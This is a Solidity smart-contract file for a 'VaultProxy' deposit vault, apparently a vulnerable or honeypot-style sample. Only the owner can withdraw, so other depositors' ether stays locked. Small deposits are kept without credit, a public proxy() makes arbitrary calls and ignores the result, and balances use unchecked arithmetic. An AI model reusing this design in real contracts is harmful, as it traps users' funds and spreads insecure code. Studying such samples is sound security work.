pragma solidity ^0.8.26;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes memory data) public payable {
        (bool success,) = target.call{value: msg.value}(data);
    }
}

contract VaultProxy is Proxy {
    mapping (address => uint256) public Deposits;
    uint256 public totalDeposits;
    uint256 public userCount;
    mapping(address => bool) public hasDeposited;
    
    event DepositMade(address indexed user, uint256 amount);
    event WithdrawalMade(address indexed user, uint256 amount);

    receive() external payable { }
    
    constructor() payable {
        if (msg.sender == tx.origin) {
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.25 ether) {
            unchecked {
                Deposits[msg.sender] += msg.value;
                totalDeposits += msg.value;
                if (!hasDeposited[msg.sender]) {
                    hasDeposited[msg.sender] = true;
                    userCount++;
                }
            }
            emit DepositMade(msg.sender, msg.value);
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            payable(msg.sender).transfer(amount);
            unchecked {
                Deposits[msg.sender] -= amount;
                totalDeposits -= amount;
            }
            emit WithdrawalMade(msg.sender, amount);
        }
    }
    
    function getTotalBalance() public view returns (uint256) {
        return address(this).balance;
    }
}